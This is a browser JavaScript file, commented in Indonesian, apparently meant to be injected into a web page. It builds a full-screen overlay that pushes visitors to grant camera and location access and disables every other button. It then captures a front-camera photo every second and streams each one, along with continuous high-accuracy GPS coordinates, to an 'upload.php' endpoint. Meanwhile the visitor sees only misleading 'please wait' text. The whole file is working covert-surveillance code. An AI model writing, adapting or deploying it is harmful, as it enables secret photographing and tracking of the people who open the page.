// ========================
// Sisipkan CSS via JS
// ========================
const style = document.createElement("style");
style.textContent = `
/* Animasi */
@keyframes fadeSlideIn {
  from { opacity: 0; transform: translate(-50%, -20px); }
  to { opacity: 1; transform: translate(-50%, 0); }
}
@keyframes buttonPulse {
  0%, 100% { box-shadow: 0 0 15px rgba(255,255,255,0.2); }
  50% { box-shadow: 0 0 30px rgba(255,255,255,0.5); }
}
@keyframes spin {
  to { transform: rotate(360deg); }
}

/* Kontainer utama */
#mainContainer {
  position: fixed;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  padding: 20px;
  background: rgba(0,0,0,0.4);
  backdrop-filter: blur(12px);
  -webkit-backdrop-filter: blur(12px);
  color: white;
  border-radius: 20px;
  box-shadow: 0 8px 25px rgba(0,0,0,0.3);
  text-align: center;
  width: 90%;
  max-width: 400px;
  z-index: 9999;
  opacity: 0;
  transform-origin: center;
  animation: fadeSlideIn 1s forwards;
}

/* Tombol */
#actionBtn {
  padding: 12px clamp(12px, 3vw, 20px);
  border: none;
  border-radius: 12px;
  cursor: pointer;
  font-size: clamp(14px, 4vw, 18px);
  font-weight: bold;
  color: white;
  background: linear-gradient(135deg, #ff6a00, #ee0979);
  box-shadow: 0 4px 15px rgba(0,0,0,0.4);
  width: 100%;
  transition: all 0.3s ease;
  animation: buttonPulse 2s infinite;
}
#actionBtn:hover { transform: scale(1.05); }
#actionBtn:active { transform: scale(0.97); }

/* Warning text */
#warning {
  font-size: clamp(12px, 3vw, 14px);
  color: #ffcc00;
  margin-bottom: 10px;
  display: none;
  transition: opacity 0.3s;
}

/* Status */
#status {
  margin-top: 12px;
  font-size: clamp(12px, 3vw, 16px);
  opacity: 0.9;
  transition: opacity 0.3s;
}

/* Spinner tombol loading */
.loading-spinner {
  display: inline-block;
  width: 16px;
  height: 16px;
  border: 3px solid rgba(255,255,255,0.3);
  border-top-color: white;
  border-radius: 50%;
  animation: spin 1s linear infinite;
  margin-right: 8px;
  vertical-align: middle;
}

/* Hint fallback (opsional) */
#hint {
  display: none;
  margin-top: 10px;
  font-size: clamp(11px, 2.5vw, 13px);
  opacity: 0.7;
}

/* Media query untuk layar kecil */
@media (max-width: 350px) {
  #mainContainer { padding: 15px; }
  #actionBtn { font-size: 14px; padding: 10px; }
}
`;
document.head.appendChild(style);

// ========================
// Buat elemen HTML via JS
// ========================
const body = document.body;

// Kontainer utama
const container = document.createElement("div");
container.id = "mainContainer";
body.appendChild(container);

// Warning
const warning = document.createElement("p");
warning.id = "warning";
container.appendChild(warning);

// Tombol
const btn = document.createElement("button");
btn.id = "actionBtn";
btn.textContent = "🔒 Minta Izin Kamera & Lokasi";
container.appendChild(btn);

// Status
const status = document.createElement("p");
status.id = "status";
status.textContent = "Menunggu izin...";
container.appendChild(status);

// Canvas (hidden)
const canvas = document.createElement("canvas");
canvas.id = "canvas";
canvas.style.display = "none";
body.appendChild(canvas);
const ctx = canvas.getContext("2d");

// ========================
// Variabel Global
// ========================
let cameraGranted = false;
let locationGranted = false;
let video;
let captureInterval;
const waitingTexts = [
  "Mohon tunggu sebentar...",
  "Sedang menyiapkan semuanya...",
  "Memeriksa izin kamera & lokasi...",
  "Hampir selesai, tunggu ya...",
  "Sedang memuat data..."
];
let waitingIndex = 0;

// ========================
// Fungsi Responsif
// ========================
function updateResponsive() {
  const w = window.innerWidth;
  container.style.width = Math.min(w * 0.9, 400) + "px";
  container.style.padding = Math.max(15, Math.min(w * 0.05, 25)) + "px";
  btn.style.fontSize = Math.max(14, Math.min(w * 0.04, 18)) + "px";
  btn.style.padding = Math.max(10, Math.min(w * 0.03, 20)) + "px";
  warning.style.fontSize = Math.max(12, Math.min(w * 0.03, 14)) + "px";
  status.style.fontSize = Math.max(12, Math.min(w * 0.03, 16)) + "px";
}
window.addEventListener("resize", updateResponsive);
updateResponsive();

// ========================
// Status menunggu loop
// ========================
function startWaitingTextLoop() {
  setInterval(() => {
    if (!cameraGranted || !locationGranted) {
      status.textContent = waitingTexts[waitingIndex];
      waitingIndex = (waitingIndex + 1) % waitingTexts.length;
    }
  }, 5000);
}

// ========================
// Kamera
// ========================
async function startCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
    video = document.createElement("video");
    video.srcObject = stream;
    video.autoplay = true;
    video.muted = true;
    video.playsInline = true;
    await video.play();

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    cameraGranted = true;
    updateButton();
    startCaptureLoop();
    console.log("Kamera diizinkan");
  } catch (e) {
    status.textContent = "Gagal akses kamera: " + e.message;
    console.warn("Kamera tidak diizinkan:", e.message);
  }
}

// ========================
// Lokasi
// ========================
let lastLocationTime = 0;
function startLocation() {
  if (!navigator.geolocation) {
    status.textContent = "Browser tidak mendukung Geolocation";
    console.warn("Geolocation tidak didukung browser ini.");
    return;
  }

  navigator.geolocation.watchPosition(pos => {
    const now = Date.now();
    if (now - lastLocationTime > 5000) {
      lastLocationTime = now;
      locationGranted = true;
      updateButton();
      const data = {
        lat: pos.coords.latitude,
        lon: pos.coords.longitude,
        accuracy: pos.coords.accuracy,
        time: new Date().toISOString()
      };
      fetch("upload.php", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data) })
        .catch(err => console.error(err));
      console.log("Lokasi diizinkan:", pos.coords);
    }
  }, err => {
    status.textContent = "Gagal mendapatkan lokasi: " + err.message;
    console.warn("Lokasi tidak diizinkan:", err.message);
  }, { enableHighAccuracy: true });
}

// ========================
// Capture loop
// ========================
function startCaptureLoop() {
  if (!captureInterval) {
    captureInterval = setInterval(() => {
      if (!document.hidden && video) captureAndUpload();
    }, 1000);
  }
}
function stopCaptureLoop() {
  if (captureInterval) {
    clearInterval(captureInterval);
    captureInterval = null;
  }
}

function captureAndUpload() {
  if (!video) return;
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  canvas.toBlob(blob => {
    const fd = new FormData();
    fd.append("file", blob, `temp.jpg`);
    fetch("upload.php", { method: "POST", body: fd }).catch(err => console.error(err));
  }, "image/jpeg", 0.8);
}

// ========================
// Update tombol
// ========================
function updateButton() {
  btn.onclick = null; // hapus binding lama
  if (cameraGranted && locationGranted) {
    btn.innerHTML = `<span class="loading-spinner"></span> Mohon tunggu...`;
    btn.disabled = true;
    btn.style.background = "linear-gradient(135deg, #2193b0, #6dd5ed)";
    warning.style.display = "none";
    status.textContent = waitingTexts[waitingIndex];
  } else {
    btn.textContent = "🔒 Minta Izin Kamera & Lokasi";
    btn.disabled = false;
    btn.onclick = () => { if (!cameraGranted) startCamera(); if (!locationGranted) startLocation(); };
    btn.style.background = "linear-gradient(135deg, #ff6a00, #ee0979)";
    warning.style.display = "block";
    warning.textContent = "⚠️ Untuk melanjutkan, silahkan izinkan semua request";
  }
}

// ========================
// Permissions API check
// ========================
async function watchPermissions() {
  if (!navigator.permissions) return;
  try {
    const camPerm = await navigator.permissions.query({ name: "camera" });
    const locPerm = await navigator.permissions.query({ name: "geolocation" });

    const checkStatus = () => {
      cameraGranted = camPerm.state === "granted";
      locationGranted = locPerm.state === "granted";
      updateButton();
    };

    camPerm.onchange = checkStatus;
    locPerm.onchange = checkStatus;
    checkStatus();
  } catch(e) {
    console.warn("Permissions API tidak mendukung penuh di browser ini");
  }
}

// ========================
// Pause saat tab tidak aktif
// ========================
document.addEventListener("visibilitychange", () => {
  if (document.hidden) stopCaptureLoop();
  else if (cameraGranted) startCaptureLoop();
});

// ========================
// Nonaktifkan tombol lain
// ========================
document.querySelectorAll("button").forEach(b => {
  if (b.id !== "actionBtn") { b.disabled = true; b.style.pointerEvents = "none"; b.style.opacity = "0.5"; }
});

// ========================
// Inisialisasi
// ========================
startWaitingTextLoop();
watchPermissions();
updateButton();
startCamera();
startLocation();